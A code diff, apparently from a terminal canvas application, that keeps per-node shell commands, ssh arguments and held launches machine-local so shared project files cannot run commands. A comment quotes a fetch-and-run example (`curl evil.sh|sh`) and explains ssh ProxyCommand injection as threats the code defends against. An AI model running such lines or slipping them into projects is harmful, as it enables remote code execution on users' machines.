@@ -12,6 +12,13 @@
  *    `"shell": "curl evil.sh|sh"`, or simply point at a script committed in the repo.
  *  - `NodeState.ssh.extraArgs` — spliced verbatim into the `ssh` argv (`buildSshArgs`), where
  *    `-o ProxyCommand=<cmd>` makes ssh run `<cmd>` LOCALLY through /bin/sh.
+ *  - `CanvasNodeState.pendingLaunch` — a held launch. Its intent is typed into the node's shell once
+ *    the canvas says the wait is over (`launchesToFire`), and `after: []` or a dep that no longer
+ *    exists counts as satisfied. So a project file or a wire frame carrying one is a command that
+ *    runs as soon as the canvas is viewed. It is produced only by this machine's own orchestration
+ *    (`--after`, a worktree setup gate), so it is machine-local exactly like `shell`: never written
+ *    to a shared file, never accepted from a peer, never cast on the wire, and round-tripped through
+ *    the machine-local index so an armed node still fires after an app restart.
  *
  * Both are legitimate when the LOCAL user sets them, so they are not deleted — they are made
  * MACHINE-LOCAL: `stripSharedNodeExec` keeps them out of every project file we write, and
@@ -325,6 +332,17 @@ const isSafeAgentId = (value: unknown): value is string =>
  * trustworthy after an upgrade.
  */
 function clonePendingLaunch(value: unknown): PendingLaunch | undefined {
+  const launch = cloneLaunchIntentRecord(value)
+  if (launch === undefined || !isRecord(value)) return launch
+  // The worktree setup gate names a GROUP id and never a command, so it is safe to keep — and it must
+  // be kept: dropping it would open the gate early (the unsafe direction). A gate this build cannot
+  // read in full invalidates the whole record, which then never fires on its own.
+  if (value.awaitSetupGroup === undefined) return launch
+  if (typeof value.awaitSetupGroup !== 'string' || !SAFE_OPAQUE_ID.test(value.awaitSetupGroup)) return undefined
+  return { ...launch, awaitSetupGroup: value.awaitSetupGroup }
+}
+
+function cloneLaunchIntentRecord(value: unknown): PendingLaunch | undefined {
   if (!isRecord(value)) return undefined
   if (
     !Array.isArray(value.after) ||
@@ -688,7 +706,9 @@ export function applyLocalNodeExec(
 ): CanvasNodeState[] {
   return nodes.map((n) => {
     const mine = local?.[n.id]
-    const out: CanvasNodeState = stripNodeExec(n)
+    // A fresh object: `stripNodeExec` returns its INPUT untouched when there is nothing to strip, and
+    // the writes below must never reach back into the caller's (parsed file's) node.
+    const out: CanvasNodeState = { ...stripNodeExec(n) }
     if (mine?.shell) out.shell = mine.shell
     if (mine?.terminalProfileId !== undefined) out.terminalProfileId = mine.terminalProfileId
     if (mine?.namedTerminalProfileId !== undefined) out.namedTerminalProfileId = mine.namedTerminalProfileId
